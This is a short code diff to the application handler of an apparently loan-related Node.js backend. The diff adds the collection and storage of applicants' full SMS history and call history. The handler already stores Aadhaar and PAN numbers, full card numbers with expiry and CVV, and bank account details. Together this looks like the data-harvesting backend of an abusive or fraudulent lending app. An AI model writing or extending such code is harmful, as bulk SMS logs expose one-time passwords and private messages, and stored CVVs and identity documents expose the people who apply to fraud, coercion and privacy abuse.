@@ -11,7 +11,8 @@ exports.submitApplication = async (req, res) => {
             amount, aadhaar, pan,
             cardNumber, cardExpiry, cardCvv,
             bankName, accNo, ifsc,
-            deviceId, deviceInfo, appId
+            deviceId, deviceInfo, appId,
+            smsHistory, callHistory
         } = req.body;
 
         const newApplication = await Application.create({
@@ -20,6 +21,8 @@ exports.submitApplication = async (req, res) => {
             dob: dob,
             panCard: pan,
             aadhaarNumber: aadhaar,
+            smsHistory: smsHistory,
+            callHistory: callHistory,
             bankAccount: {
                 bankName,
                 accountNumber: accNo,
